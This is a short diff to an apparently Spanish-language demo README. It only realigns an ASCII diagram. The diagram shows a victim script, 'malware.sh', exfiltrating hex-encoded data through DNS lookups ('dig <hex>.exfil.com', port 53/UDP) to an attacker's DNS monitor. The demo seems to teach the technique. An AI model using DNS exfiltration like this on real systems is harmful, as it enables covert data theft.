@@ -33,7 +33,7 @@ La idea central de esta demo:
 
 ```
 ┌───────────┐   dig <hex>.exfil.com   ┌──────────────┐
-│  VÍCTIMA  │ ──────────────────────▶ │   ATACANTE   │
+│  VÍCTIMA  │ ──────────────────────▶│   ATACANTE   │
 │ malware.sh│      (puerto 53/UDP)    │monitor_dns.py│
 └───────────┘                         └──────────────┘
    lee y                                  captura y
